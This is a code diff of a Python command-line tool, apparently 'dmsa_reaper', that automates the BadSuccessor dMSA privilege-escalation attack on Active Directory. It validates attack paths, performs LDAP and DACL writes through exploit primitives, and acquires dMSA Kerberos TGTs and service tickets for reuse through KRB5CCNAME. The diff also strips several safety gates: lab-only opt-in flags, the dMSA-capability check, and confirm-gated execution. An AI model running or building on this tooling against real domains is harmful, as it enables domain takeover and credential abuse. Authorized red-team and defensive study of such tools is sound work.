-            from dmsa_reaper.scope import check_domain_match
-            try:
-                check_domain_match(state.environment.domain, scope)
-            except ValueError as exc:
-                raise typer.BadParameter(str(exc)) from exc
-        paths = rank_paths(classify_paths(state, expand_targets=expand_targets))
-
-    selected = next((p for p in paths if p.id == path_id), None)
-    if not selected:
-        raise typer.BadParameter(f"path not found: {path_id}")
-
+    configure_ops_dir(ops_dir)
+    state = MapState.load(state_path)
+    selected = _select_path(state, path_id)
     if not selected.executable:
-        if selected.primitive in {"self-write-map", "self-pkinit-loop"}:
-            raise typer.BadParameter(
-                f"path {selected.id} ({selected.primitive}) is informational and is not "
-                "a runnable exploit primitive."
-            )
+        raise typer.BadParameter(f"path is not executable: {path_id}")
+
+    from dmsa_reaper.scope import (
+        check_dacl_scope_gates,
+        check_domain_match,
+        load_scope,
+    )
+
+    scope, scope_hash = load_scope(scope_file)
+    try:
+        check_domain_match(state.environment.domain, scope)
+    except ValueError as exc:
+        raise typer.BadParameter(str(exc)) from exc
+    if confirm and scope.require_confirm_string and confirm_string != scope.domain:
         raise typer.BadParameter(
-            f"path {selected.id} ({selected.primitive}) is not directly executable.\n"
-            f"This path requires a manual DACL modification step before the primitive can run.\n"
-            f"Required rights: {', '.join(selected.required_rights)}"
+            f"--confirm-string must exactly match {scope.domain!r}"
         )
 
-    if selected.requires_operator_target and not target_dn and not selected.target_dn:
+    primitive = get_primitives().get(selected.primitive)
+    if primitive is None or not primitive.check(selected):
         raise typer.BadParameter(
-            f"path {selected.id} ({selected.primitive}) requires a target account.\n"
-            f"Pass --target-dn <DN-of-target-account>."
+            f"no executor is available for {selected.primitive}"
         )
 
-    primitives = get_primitives()
-    primitive = primitives.get(primitive_name or selected.primitive)
-    if not primitive:
-        raise typer.BadParameter(f"unknown primitive: {primitive_name or selected.primitive}")
-    if not primitive.check(selected):
-        raise typer.BadParameter(f"primitive {primitive.name} cannot execute path {selected.id}")
-
-    if primitive.name == "legacy-oneway-link" and not allow_legacy_oneway_link:
-        raise typer.BadParameter(
-            "legacy-oneway-link is lab/legacy only and requires --allow-legacy-oneway-link. "
-            "Patched KDCs may accept LDAP writes but refuse ticket semantics."
-        )
-    if primitive.name == "existing-dmsa-legacy-link" and not allow_existing_dmsa_legacy_link:
-        raise typer.BadParameter(
-            "existing-dmsa-legacy-link is lab/legacy only and requires "
-            "--allow-existing-dmsa-legacy-link. Patched KDCs require reciprocal target-side state."
-        )
-
-    if primitive.modifies_directory and scope is None:
-        raise typer.BadParameter(
-            f"{primitive.name} performs LDAP writes and requires --scope <file>."
-        )
-    if confirm and scope is not None and scope.require_confirm_string:
-        if confirm_string != scope.domain:
-            raise typer.BadParameter(
-                "--confirm-string must be provided and must exactly match scope.domain "
-                f"({scope.domain!r})"
-            )
-    if confirm and selected.requires_operator_target and not allow_grouped_target_selection:
-        raise typer.BadParameter(
-            f"path {selected.id} ({selected.primitive}) is grouped and requires --target-dn. "
-            "For confirmed execution use --expand-targets, or pass "
-            "--allow-grouped-target-selection for an explicit operator-selected target."
-        )
-
-    if confirm and state is not None and state.environment.dmsa_capable_status != CheckStatus.present:
-        if not allow_lab_environment:
-            raise typer.BadParameter(
-                "Mapped environment is not confirmed dMSA-capable "
-                f"(dmsa_capable_status={state.environment.dmsa_capable_status}). "
-                "Use --allow-lab-environment only for an explicitly authorized lab override."
-            )
-
-    # Validate --chain for dacl-container-escalate: must be explicit, no default.
+    effective_target = target_dn or selected.target_dn
+    effective_container = container_dn or selected.container_dn
+    if selected.requires_operator_target and not effective_target:
+        raise typer.BadParameter("--target-dn is required for this path")
+    if primitive.name == "dacl-target-escalate" and not effective_container:
+        raise typer.BadParameter("--container-dn is required for this path")
     if primitive.name == "dacl-container-escalate":
-        if chain is None:
+        if chain not in {"postpatch", "legacy"}:
             raise typer.BadParameter(
-                "--chain is required for dacl-container-escalate.\n"
-                "  --chain legacy    — write ManagedAccountPrecededByLink only\n"
-                "  --chain postpatch — also write msDS-Superseded* on target (patched DCs)"
+                "--chain postpatch or --chain legacy is required for this path"
             )
-        if chain not in ("legacy", "postpatch"):
-            raise typer.BadParameter(
-                f"--chain must be 'legacy' or 'postpatch', got: {chain!r}"
-            )
-    elif chain is not None and chain not in ("legacy", "postpatch"):
-        raise typer.BadParameter(
-            f"--chain must be 'legacy' or 'postpatch', got: {chain!r}"
-        )
+    elif chain is not None:
+        raise typer.BadParameter("--chain is only valid for dacl-container-escalate")
 
     if primitive.name in _DACL_PRIMITIVES:
-        from dmsa_reaper.scope import check_dacl_scope_gates
         try:
             check_dacl_scope_gates(
                 scope,
@@ -1518,348 +695,265 @@ def exploit_cmd(
         except ValueError as exc:
             raise typer.BadParameter(str(exc)) from exc
 
-    effective_target_dn = target_dn or selected.target_dn
-    target_warnings, exact_target_writable_attrs = _validate_exact_postpatch_target(
-        state=state,
-        target_dn=effective_target_dn,
-        primitive_name=primitive.name,
-        chain=chain,
-        allow_unmapped_target=allow_unmapped_target,
-        confirm=confirm,
+    writable_attrs = _target_writable_attrs(
+        state,
+        effective_target,
+        primitive.name,
+        chain,
     )
-    for warning in target_warnings:
-        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {warning}")
-
-    # ── Runtime state revalidation for confirmed execution ─────────────────
-    # Paths.json is advisory; state.json is the source of truth for writes.
-    # Each check raises typer.BadParameter unless the corresponding override
-    # flag is supplied (which records a warning and stores the flag in metadata).
-    _container_state_warnings: list[str] = []
-    _dmsa_state_warnings: list[str] = []
-    _target_dacl_warnings: list[str] = []
 
     if confirm:
-        if primitive.name in ("postpatch-mutual-pair", "legacy-oneway-link"):
-            _eff_container = container_dn or selected.container_dn
-            if _eff_container:
-                _container_state_warnings = _check_container_create_rights(
-                    state, _eff_container, allow_unmapped_container
+        if primitive.name in {"postpatch-mutual-pair", "legacy-oneway-link"}:
+            if not effective_container:
+                raise typer.BadParameter("selected path has no container DN")
+            _require_container_right(
+                state,
+                effective_container,
+                _CREATE_CHILD_RIGHTS,
+                "CreateChild:dMSA",
+            )
+        elif primitive.name in {
+            "existing-dmsa-postpatch-mutual",
+            "existing-dmsa-legacy-link",
+        }:
+            if not selected.dmsa_dn:
+                raise typer.BadParameter("selected path has no dMSA DN")
+            _require_dmsa_migration_right(state, selected.dmsa_dn)
+        elif primitive.name == "dacl-container-escalate":
+            if not effective_container:
+                raise typer.BadParameter("selected path has no container DN")
+            _require_container_right(
+                state,
+                effective_container,
+                _DACL_CONTROL_RIGHTS,
+                "WriteDACL/GenericAll",
+            )
+        elif primitive.name == "dacl-target-escalate":
+            if not effective_container or not effective_target:
+                raise typer.BadParameter(
+                    "dacl-target-escalate needs target and container DNs"
                 )
+            _require_container_right(
+                state,
+                effective_container,
+                _CREATE_CHILD_RIGHTS,
+                "CreateChild:dMSA",
+            )
+            _require_target_dacl_right(state, effective_target)
 
-        if primitive.name in ("existing-dmsa-postpatch-mutual", "existing-dmsa-legacy-link"):
-            if selected.dmsa_dn:
-                _dmsa_state_warnings = _validate_dmsa_migration_rights(
-                    state, selected.dmsa_dn, allow_unmapped_dmsa
-                )
-
-        if primitive.name == "dacl-container-escalate":
-            _eff_container = container_dn or selected.container_dn
-            if _eff_container:
-                _container_state_warnings = _validate_container_dacl_control(
-                    state, _eff_container, allow_unmapped_container
-                )
-
-        if primitive.name == "dacl-target-escalate":
-            _eff_container = container_dn or selected.container_dn
-            if _eff_container:
-                _container_state_warnings = _check_container_create_rights(
-                    state, _eff_container, allow_unmapped_container
-                )
-            _eff_target = target_dn or selected.target_dn
-            if _eff_target:
-                _target_dacl_warnings = _validate_target_dacl_control(
-                    state, _eff_target, allow_unmapped_target
-                )
-
-    for warning in _container_state_warnings + _dmsa_state_warnings + _target_dacl_warnings:
-        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {warning}")
-
-    # Run preflight checks (scope, target DN, container DN, etc.)
     try:
-        warnings = primitive.preflight(
-            selected, scope=scope, target_dn=target_dn, container_dn=container_dn
-        )
+        warnings = [
+            *selected.environment_warnings,
+            *primitive.preflight(
+                selected,
+                scope=scope,
+                target_dn=effective_target,
+                container_dn=effective_container,
+            ),
+        ]
     except Exception as exc:
-        raise typer.BadParameter(f"Preflight failed: {exc}") from exc
-    for w in warnings:
-        print(f"[yellow]PREFLIGHT WARNING:[/yellow] {w}")
+        raise typer.BadParameter(f"preflight failed: {exc}") from exc
+    for warning in dict.fromkeys(warnings):
+        print(f"[yellow][!] {warning}[/yellow]")
 
     if dry_run:
-        # Build an in-memory preview operation — no file is written to .reaper/.
-        from dmsa_reaper.models import Operation
-        preview_op = Operation(
+        preview = Operation(
             id="DRY-RUN",
             primitive=selected.primitive,
             path_id=selected.id,
-            metadata={"path": selected.model_dump()},
+            metadata={"path": selected.model_dump(mode="json")},
         )
-        if target_dn:
-            preview_op.metadata["target_dn"] = target_dn
-        if exact_target_writable_attrs is not None:
-            preview_op.metadata["target_writable_attrs"] = exact_target_writable_attrs
-        if target_warnings:
-            preview_op.metadata["warnings"] = target_warnings
-            preview_op.metadata["allow_unmapped_target"] = True
-        if _container_state_warnings:
-            preview_op.metadata.setdefault("warnings", []).extend(_container_state_warnings)
-            preview_op.metadata["allow_unmapped_container"] = True
-        if _dmsa_state_warnings:
-            preview_op.metadata.setdefault("warnings", []).extend(_dmsa_state_warnings)
-            preview_op.metadata["allow_unmapped_dmsa"] = True
-        if _target_dacl_warnings:
-            preview_op.metadata.setdefault("warnings", []).extend(_target_dacl_warnings)
-            preview_op.metadata.setdefault("allow_unmapped_target", True)
-        if container_dn:
-            preview_op.metadata["container_dn"] = container_dn
-        if dmsa_name:
-            preview_op.metadata["dmsa_name"] = dmsa_name
-        if allow_broad_dacl:
-            preview_op.metadata["allow_broad_dacl"] = True
-        if scope is not None and scope.allow_broad_dacl:
-            preview_op.metadata["scope_allow_broad_dacl"] = True
-        if chain:
-            preview_op.metadata["chain"] = chain
-        if allow_existing_dmsa_legacy_link:
-            preview_op.metadata["allow_existing_dmsa_legacy_link"] = True
-        # Inject state metadata so dry-run output reflects actual principal and schema.
-        if state is not None and state.current_principal:
-            preview_op.metadata.setdefault("principal_sid", state.current_principal.sid)
-        if state is not None and state.schema_cache.attr_guids:
-            preview_op.metadata.setdefault("attr_guids", state.schema_cache.attr_guids)
-        if state is not None and state.schema_cache.dmsa_class_guid:
-            preview_op.metadata.setdefault("dmsa_class_guid", state.schema_cache.dmsa_class_guid)
-        steps = primitive.dry_run_steps(preview_op)
+        _populate_operation(
+            preview,
+            state=state,
+            target_dn=effective_target,
+            container_dn=effective_container,
+            chain=chain,
+            dmsa_name=dmsa_name,
+            target_writable_attrs=writable_attrs,
+            allow_broad_dacl=allow_broad_dacl,
+            scope_allow_broad_dacl=scope.allow_broad_dacl,
+            dc_host=dc_host,
+            dc_ip=dc_ip,
+        )
+        steps = primitive.dry_run_steps(preview)
         if json_out:
             _write_json(
                 json_out,
                 {
-                    "mode": "dry-run",
-                    "operation": preview_op.model_dump(mode="json"),
+                    "operation": preview.model_dump(mode="json"),
                     "steps": steps,
                     "ldap_writes_performed": False,
                 },
             )
-            print(f"[green]wrote exploit dry-run JSON[/green] {json_out}")
-        print(Panel(
-            "\n".join(steps),
-            title=f"[yellow]DRY RUN[/yellow]  {selected.primitive}  {path_id}",
-            subtitle="No LDAP writes will be made",
-            expand=False,
-        ))
+        print(
+            Panel(
+                "\n".join(steps),
+                title=f"[yellow]dry run[/yellow] {selected.primitive}",
+                subtitle="No LDAP writes were made",
+                expand=False,
+            )
+        )
         return
 
-    if confirm and not domain and not dc_ip and not dc_host:
-        raise typer.BadParameter("--domain (or --dc-ip / --dc-host) is required with --confirm")
-
-    conn = None
-    execution_identity: dict[str, str] = {}
-    validated_guids: dict[str, str] = {}
-    if confirm:
-        cfg = LdapAuthConfig(
-            domain=domain or "",
-            dc_ip=dc_ip,
-            dc_host=dc_host,
-            username=username,
-            password=password,
-            kerberos=kerberos,
-            use_ldaps=use_ldaps,
-            start_tls=start_tls,
+    effective_domain = domain or state.environment.domain
+    if not effective_domain and not dc_ip and not dc_host:
+        raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
+    conn = bind(
+        _make_ldap_config(
+            effective_domain or "",
+            dc_ip,
+            dc_host,
+            username,
+            password,
+            kerberos,
+            use_ldaps,
+            start_tls,
         )
-        conn = bind(cfg)
-        execution_identity = _validate_execution_binding(
-            conn=conn,
-            state=state,
-            username=username,
-            kerberos=kerberos,
-            dc_host=dc_host,
-            dc_ip=dc_ip,
-        )
-        if state is not None:
-            validated_guids = _revalidate_mapped_guids(
-                conn=conn,
-                state=state,
-                dns=[
-                    container_dn or selected.container_dn,
-                    target_dn or selected.target_dn,
-                    selected.dmsa_dn,
-                ],
-            )
+    )
+    execution_identity = _validate_execution_binding(
+        conn=conn,
+        state=state,
+        username=username,
+        kerberos=kerberos,
+        dc_host=dc_host,
+        dc_ip=dc_ip,
+    )
+    validated_guids = _revalidate_mapped_guids(
+        conn=conn,
+        state=state,
+        dns=[effective_container, effective_target, selected.dmsa_dn],
+    )
 
-    # Build the durable operation log entry - written before any LDAP write.
-    op = primitive.plan(selected)
-
-    if target_dn:
-        op.metadata["target_dn"] = target_dn
-    if exact_target_writable_attrs is not None:
-        op.metadata["target_writable_attrs"] = exact_target_writable_attrs
-    if target_warnings:
-        op.metadata.setdefault("warnings", []).extend(target_warnings)
-        op.metadata["allow_unmapped_target"] = True
-    if _container_state_warnings:
-        op.metadata.setdefault("warnings", []).extend(_container_state_warnings)
-        op.metadata["allow_unmapped_container"] = True
-    if _dmsa_state_warnings:
-        op.metadata.setdefault("warnings", []).extend(_dmsa_state_warnings)
-        op.metadata["allow_unmapped_dmsa"] = True
-    if _target_dacl_warnings:
-        op.metadata.setdefault("warnings", []).extend(_target_dacl_warnings)
-        op.metadata.setdefault("allow_unmapped_target", True)
-    if container_dn:
-        op.metadata["container_dn"] = container_dn
-    if dmsa_name:
-        op.metadata["dmsa_name"] = dmsa_name
-    if allow_broad_dacl:
-        op.metadata["allow_broad_dacl"] = True
-    if scope is not None and scope.allow_broad_dacl:
-        op.metadata["scope_allow_broad_dacl"] = True
-    if chain:
-        op.metadata["chain"] = chain
-    if allow_existing_dmsa_legacy_link:
-        op.metadata["allow_existing_dmsa_legacy_link"] = True
-    if scope_hash:
-        op.scope_file_hash = scope_hash
-    operation_domain = None
-    if state is not None and state.environment.domain:
-        operation_domain = state.environment.domain
-    elif domain:
-        operation_domain = domain
-    if operation_domain:
-        op.metadata.setdefault("domain", operation_domain.lower())
-        op.metadata.setdefault("realm", operation_domain.upper())
-    op.metadata["execution_identity"] = execution_identity
-    op.metadata["validated_object_guids"] = validated_guids
-    op.metadata["dc_host"] = dc_host
-    op.metadata["dc_ip"] = dc_ip
-
-    # Embed current principal SID for DACL primitives that need it to build ACEs.
-    if state is not None and state.current_principal:
-        op.metadata.setdefault("principal_sid", state.current_principal.sid)
-
-    # Embed schema_cache data for dacl-* primitives.
-    if state is not None and state.schema_cache.attr_guids:
-        op.metadata.setdefault("attr_guids", state.schema_cache.attr_guids)
-    if state is not None and state.schema_cache.dmsa_class_guid:
-        op.metadata.setdefault("dmsa_class_guid", state.schema_cache.dmsa_class_guid)
-
-    # For postpatch chain: embed the target's writable attrs so the primitive can
-    # verify target-side access before any LDAP writes.
-    save_operation(op)
+    operation = primitive.plan(selected)
+    operation.scope_file_hash = scope_hash
+    _populate_operation(
+        operation,
+        state=state,
+        target_dn=effective_target,
+        container_dn=effective_container,
+        chain=chain,
+        dmsa_name=dmsa_name,
+        target_writable_attrs=writable_attrs,
+        allow_broad_dacl=allow_broad_dacl,
+        scope_allow_broad_dacl=scope.allow_broad_dacl,
+        dc_host=dc_host,
+        dc_ip=dc_ip,
+    )
+    operation.metadata["execution_identity"] = execution_identity
+    operation.metadata["validated_object_guids"] = validated_guids
+    save_operation(operation)
+    print(f"[*] Operation: {operation.id}")
 
     try:
-        op = primitive.execute(op, confirm=confirm, conn=conn)
+        operation = primitive.execute(operation, confirm=True, conn=conn)
     except Exception:
-        if cleanup_policy == "on-failure" and conn is not None:
-            op = cleanup_operation(op, conn=conn)
-            save_operation(op)
-            cleanup_meta = op.metadata.get("cleanup") or {}
+        if cleanup_policy == "on-failure":
+            operation = cleanup_operation(operation, conn=conn)
+            save_operation(operation)
             print(
-                f"[yellow]automatic cleanup[/yellow] status={op.status} "
-                f"verified={str(bool(cleanup_meta.get('ok'))).lower()}"
+                f"[yellow][!] Automatic cleanup status: {operation.status}[/yellow]"
             )
         raise
-    save_operation(op)
+
+    save_operation(operation)
     if json_out:
-        _write_json(
-            json_out,
-            {
-                "mode": "confirm",
-                "operation": op.model_dump(mode="json"),
-                "ldap_writes_performed": True,
-            },
-        )
-        print(f"[green]wrote exploit JSON[/green] {json_out}")
-    print(f"[yellow]operation[/yellow] {op.id} status={op.status}")
-    if op.status == "executed":
-        _print_exploit_result(op)
+        _write_json(json_out, operation.model_dump(mode="json"))
+        print(f"[green][+] Operation written:[/green] {json_out}")
+    print(f"[green][+] Status:[/green] {operation.status}")
+    _print_exploit_result(operation)
 
 
-@app.command("cleanup")
-@app.command("recover")
-def cleanup_cmd(
-    op_id: str = typer.Option(..., "--op", help="Operation ID to clean up or recover."),
+@app.command("tgt")
+def tgt_cmd(
+    op_id: str = typer.Option(..., "--op", help="Executed operation ID."),
+    source_ccache: Path = typer.Option(
+        ...,
+        "--ccache",
+        help="Operator TGT ccache used for the dMSA exchange.",
+    ),
+    identity: str = typer.Option(
+        ...,
+        "--identity",
+        help="Operator account represented by the source ccache.",
+    ),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
+    dc_ip: Optional[str] = typer.Option(None, "--dc-ip"),
+    runs_dir: Optional[Path] = typer.Option(None, "--runs-dir"),
     ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
     json_out: Optional[Path] = typer.Option(None, "--json"),
-    domain: str = _OPT_DOMAIN,
-    dc_ip: Optional[str] = _OPT_DC_IP,
-    dc_host: Optional[str] = _OPT_DC_HOST,
-    username: Optional[str] = _OPT_USER,
-    password: Optional[str] = _OPT_PASS,
-    kerberos: bool = _OPT_KRB,
-    use_ldaps: bool = _OPT_LDAPS,
-    start_tls: bool = _OPT_STARTTLS,
-):
-    """Resume conflict-aware cleanup using an operation journal."""
+) -> None:
+    """Acquire and save a TGT for the operation's dMSA."""
     configure_ops_dir(ops_dir)
     operation = load_operation(op_id)
-    if operation.cleaned_up and operation.cleanup_verified:
-        print(f"operation {operation.id} is already cleaned and verified")
-    else:
-        if not domain and not dc_ip and not dc_host:
-            raise typer.BadParameter("--domain (or --dc-ip / --dc-host) is required")
-        conn = bind(
-            _make_ldap_config(
-                domain or "", dc_ip, dc_host, username, password, kerberos, use_ldaps, start_tls
-            )
+    effective_domain = domain or operation.metadata.get("domain")
+    if not effective_domain:
+        raise typer.BadParameter("--domain is required")
+    effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
+    effective_runs_dir = runs_dir or (get_ops_dir().parent / "runs")
+    try:
+        result = acquire_dmsa_tgt(
+            operation,
+            source_ccache=source_ccache,
+            identity=identity,
+            domain=str(effective_domain),
+            dc_ip=effective_dc_ip,
+            runs_dir=effective_runs_dir,
         )
-        operation = cleanup_operation(operation, conn=conn)
+    except TicketAcquisitionError as exc:
+        operation.metadata["tgt"] = {"status": "failed", "reason": str(exc)}
         save_operation(operation)
-    payload = {
-        "operation_id": operation.id,
-        "status": operation.status,
-        "cleanup_verified": operation.cleanup_verified,
-        "cleanup": operation.metadata.get("cleanup"),
-        "operation": operation.model_dump(mode="json"),
-    }
-    cleanup_artifact = get_ops_dir().parent / "runs" / operation.id / "cleanup.json"
-    cleanup_artifact.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
-    _write_json(cleanup_artifact, payload)
-    cleanup_artifact.chmod(0o600)
+        raise typer.BadParameter(str(exc)) from exc
+    operation.metadata["tgt"] = result
+    save_operation(operation)
     if json_out:
-        _write_json(json_out, payload)
-        print(f"[green]wrote cleanup JSON[/green] {json_out}")
-    cleanup_meta = operation.metadata.get("cleanup") or {}
-    for conflict in cleanup_meta.get("conflicts", []):
-        print(f"[red]conflict[/red] {conflict.get('dn')}: {conflict.get('reason')}")
-    for error in cleanup_meta.get("errors", []):
-        print(f"[red]error[/red] {error.get('dn')}: {error.get('reason')}")
-    print(
-        f"operation {operation.id} status={operation.status} "
-        f"cleanup_verified={str(operation.cleanup_verified).lower()}"
-    )
+        _write_json(json_out, result)
+    print("[green][+] dMSA TGT acquired[/green]")
+    print(f"[*] Cache: {result['tgt_ccache']}")
+    print(f"[*] Client: {result['client']}")
+    print(f"export KRB5CCNAME={result['tgt_ccache']}")
 
 
 @app.command("ticket")
 def ticket_cmd(
     op_id: str = typer.Option(..., "--op", help="Executed operation ID."),
     source_ccache: Path = typer.Option(
-        ..., "--ccache", help="Existing operator TGT ccache used to request the dMSA ticket."
+        ...,
+        "--ccache",
+        help="Operator TGT ccache used for the dMSA exchange.",
     ),
     identity: str = typer.Option(
-        ..., "--identity", help="Operator account name represented by the source ccache."
+        ...,
+        "--identity",
+        help="Operator account represented by the source ccache.",
     ),
     service: Optional[str] = typer.Option(
-        None, "--service", help="Harmless validation SPN, for example cifs/dc01.corp.local."
+        None,
+        "--service",
+        "--spn",
+        help="Service SPN, for example cifs/dc01.corp.local.",
     ),
     domain: Optional[str] = typer.Option(None, "--domain", "-d"),
     dc_host: Optional[str] = typer.Option(None, "--dc-host"),
     dc_ip: Optional[str] = typer.Option(None, "--dc-ip"),
-    runs_dir: Path = typer.Option(Path(".reaper/runs"), "--runs-dir"),
+    runs_dir: Optional[Path] = typer.Option(None, "--runs-dir"),
     ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
     json_out: Optional[Path] = typer.Option(None, "--json"),
-):
-    """Acquire and validate a native dMSA ccache plus a test service ticket."""
+) -> None:
+    """Acquire a dMSA TGT and a service ticket."""
     configure_ops_dir(ops_dir)
     operation = load_operation(op_id)
     effective_domain = domain or operation.metadata.get("domain")
     if not effective_domain:
-        raise typer.BadParameter("--domain is required when it is absent from the operation")
-    effective_service = service or (f"cifs/{dc_host}" if dc_host else None)
+        raise typer.BadParameter("--domain is required")
+    effective_dc_host = dc_host or operation.metadata.get("dc_host")
+    effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
+    effective_service = service or (
+        f"cifs/{effective_dc_host}" if effective_dc_host else None
+    )
     if not effective_service:
-        raise typer.BadParameter("--service or --dc-host is required for service-ticket validation")
-    operation.requested_ticket = True
-    if dc_host:
-        operation.metadata["dc_host"] = dc_host
-    save_operation(operation)
+        raise typer.BadParameter("--service/--spn or --dc-host is required")
+    effective_runs_dir = runs_dir or (get_ops_dir().parent / "runs")
     try:
         result = acquire_dmsa_ticket(
             operation,
@@ -1867,109 +961,32 @@ def ticket_cmd(
             identity=identity,
             domain=str(effective_domain),
             service=effective_service,
-            dc_ip=dc_ip,
-            runs_dir=runs_dir,
+            dc_ip=effective_dc_ip,
+            runs_dir=effective_runs_dir,
         )
     except TicketAcquisitionError as exc:
-        operation.metadata["ticket"] = {"status": "failed", "reason": str(exc)}
+        operation.metadata["ticket"] = {
+            "status": "failed",
+            "reason": str(exc),
+        }
         save_operation(operation)
         raise typer.BadParameter(str(exc)) from exc
     operation.metadata["ticket"] = result
-    operation.verified_ticket = True
-    operation.ticket_verified_at = result["verified_at"]
-    operation.verified = operation.verified_ldap and operation.verified_ticket
     save_operation(operation)
     if json_out:
         _write_json(json_out, result)
-        print(f"[green]wrote ticket JSON[/green] {json_out}")
-    print("[green][+] BadSuccessor confirmed[/green]")
-    print(f"[green][+] dMSA TGT:[/green] {result['tgt_ccache']}")
-    print(f"[green][+] Client:[/green] {result['client']}")
-    print(f"[green][+] Target:[/green] {result.get('target')}")
-    print(f"[green][+] Service ticket:[/green] {result['service']}")
-    print(f"export KRB5CCNAME={result['tgt_ccache']}")
-    print(f"handoff script: {result['use_script']}")
+    print("[green][+] Service ticket acquired[/green]")
+    print(f"[*] dMSA TGT: {result['tgt_ccache']}")
+    print(f"[*] Service cache: {result['service_ccache']}")
+    print(f"[*] Client: {result['client']}")
+    print(f"export KRB5CCNAME={result['service_ccache']}")
+    print(f"[*] Handoff: {result['use_script']}")
 
 
-@app.command("verify")
-def verify_cmd(
-    op_id: str = typer.Option(..., "--op", help="Operation ID to verify (e.g. OP-20260528-deadbeef)."),
-    mode: str = typer.Option("ldap", "--mode", hidden=True),
-    json_out: Optional[Path] = typer.Option(None, "--json", help="Write verification result as JSON."),
-    external_cmd: Optional[str] = typer.Option(
-        None, "--external-cmd", hidden=True,
-        help="Shell command for --mode external. Requires --allow-shell-external.",
-    ),
-    external_argv: Optional[list[str]] = typer.Option(
-        None, "--external-argv", hidden=True,
-        help=(
-            "Argument list for --mode external (preferred — no shell injection risk). "
-            "Example: --external-argv rubeus.exe asktgt /user:dmsa$ /domain:corp.local"
-        ),
-    ),
-    evidence_file: Optional[Path] = typer.Option(
-        None,
-        "--evidence-file",
-        hidden=True,
-        help="Structured Kerberos proof JSON file to record for --mode external.",
-    ),
-    kerberos_adapter: Optional[str] = typer.Option(
-        None,
-        "--kerberos-adapter",
-        hidden=True,
-        help="Optional external Kerberos proof adapter name. No adapter runs by default.",
-    ),
-    adapter_command: Optional[str] = typer.Option(
-        None,
-        "--adapter-command",
-        hidden=True,
-        help=(
-            "Command template for --kerberos-adapter. Placeholders: "
-            "{operation_id}, {target_dn}, {target_sam}, {created_dmsa_dn}, {created_dmsa_sam}."
-        ),
-    ),
-    adapter_command_file: Optional[Path] = typer.Option(
-        None,
-        "--adapter-command-file",
-        hidden=True,
-        help="JSON file containing adapter command template or argv list.",
-    ),
-    adapter_dry_run: bool = typer.Option(
-        False,
-        "--adapter-dry-run",
-        hidden=True,
-        help="Render adapter command without executing it.",
-    ),
-    scope_file: Optional[Path] = typer.Option(
-        None,
-        "--scope",
-        hidden=True,
-        help="Scope JSON required when executing an external Kerberos adapter.",
-    ),
-    confirm_string: Optional[str] = typer.Option(
-        None,
-        "--confirm-string",
-        hidden=True,
-        help="Required with --kerberos-adapter; must match scope.domain.",
-    ),
-    allow_shell_external: bool = typer.Option(
-        False,
-        "--allow-shell-external",
-        hidden=True,
-        help="Allow --external-cmd to run through shell=True.",
-    ),
-    store_external_output: bool = typer.Option(
-        False,
-        "--store-external-output",
-        hidden=True,
-        help="Store full stdout/stderr in the operation log instead of hashes and lengths only.",
-    ),
-    ops_dir: Optional[Path] = typer.Option(
-        None,
-        "--ops-dir",
-        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
-    ),
-    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Target domain FQDN."),
+@app.command("cleanup")
+def cleanup_cmd(
+    op_id: str = typer.Option(..., "--op", help="Operation ID to clean up."),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
     dc_ip: Optional[str] = _OPT_DC_IP,
     dc_host: Optional[str] = _OPT_DC_HOST,
     username: Optional[str] = _OPT_USER,
@@ -1977,1453 +994,55 @@ def verify_cmd(
     kerberos: bool = _OPT_KRB,
     use_ldaps: bool = _OPT_LDAPS,
     start_tls: bool = _OPT_STARTTLS,
-):
-    """Verify that an operation's LDAP writes are still in effect."""
-    configure_ops_dir(ops_dir)
-    op = load_operation(op_id)
-
-    if mode != "ldap":
-        raise typer.BadParameter(
-            "external proof modes were removed; use 'dmsa-reaper ticket' for native Kerberos proof"
-        )
-
-    if mode == "ldap":
-        if not domain and not dc_ip and not dc_host:
-            raise typer.BadParameter("--domain (or --dc-ip / --dc-host) is required for --mode ldap")
-        cfg = _make_ldap_config(
-            domain or "", dc_ip, dc_host, username, password, kerberos, use_ldaps, start_tls
-        )
-        conn = bind(cfg)
-        details = verify_operation_ldap_details(op, conn=conn)
-        record_ldap_verification(op, details)
-        op.metadata["ldap_verification_note"] = (
-            "LDAP-state verification does not prove Kerberos ticket issuance."
-        )
-        save_operation(op)
-        if json_out:
-            _write_json(
-                json_out,
-                {
-                    "mode": "ldap",
-                    "operation_id": op.id,
-                    "status": details["status"],
-                    "ok": details["ok"],
-                    "details": details,
-                    "operation": op.model_dump(mode="json"),
-                    "note": op.metadata["ldap_verification_note"],
-                },
-            )
-            print(f"[green]wrote verify JSON[/green] {json_out}")
-        print("LDAP-state verification does not prove Kerberos ticket issuance.")
-        for created in details["created_objects"]:
-            print(
-                f"created-object {created['status']}: {created['dn']} "
-                f"({created['reason']})"
-            )
-        for attr in details["attributes"]:
-            print(
-                f"attribute {attr['status']}: {attr['dn']} {attr['attribute']} "
-                f"({attr['reason']})"
-            )
-        if details["partial_reasons"]:
-            for reason in details["partial_reasons"]:
-                print(f"partial: {reason}")
-        if details["failures"]:
-            for failure in details["failures"]:
-                print(f"failed: {failure}")
-        print(
-            "target-side verified="
-            f"{details['target_side_verified']} created-objects verified="
-            f"{details['created_objects_verified']}"
-        )
-        print(f"mode=ldap verified={details['status']}")
-
-    elif mode == "external":
-        if evidence_file:
-            evidence, digest = load_evidence_file(evidence_file)
-            try:
-                external_meta = validate_kerberos_evidence(op, evidence, digest)
-            except ExternalProofError as exc:
-                raise typer.BadParameter(str(exc)) from exc
-            if external_meta.get("type") == BASE_PROOF_TYPE:
-                record_kerberos_base_check(op, external_meta)
-            else:
-                record_external_verification(op, external_meta)
-            save_operation(op)
-            if json_out:
-                _write_json(
-                    json_out,
-                    {
-                        "mode": "external",
-                        "operation_id": op.id,
-                        "status": external_meta["status"],
-                        "ok": external_meta["ok"],
-                        "proof": external_meta,
-                        "operation": op.model_dump(mode="json"),
-                    },
-                )
-                print(f"[green]wrote verify JSON[/green] {json_out}")
-            if external_meta.get("type") == BASE_PROOF_TYPE:
